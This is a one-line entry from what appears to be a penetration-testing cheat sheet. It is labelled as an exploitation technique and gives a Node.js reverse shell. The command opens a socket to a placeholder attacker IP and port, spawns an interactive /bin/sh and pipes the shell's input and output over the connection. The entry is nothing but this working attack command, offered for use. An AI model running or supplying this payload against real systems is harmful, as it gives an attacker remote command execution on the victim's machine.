# [Exploitation] Reverse shell (net.Socket + spawn) --node
node -e 's=require("net").Socket();s.connect(<port>,"<attacker_ip>",()=>{p=require("child_process").spawn("/bin/sh",["-i"]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
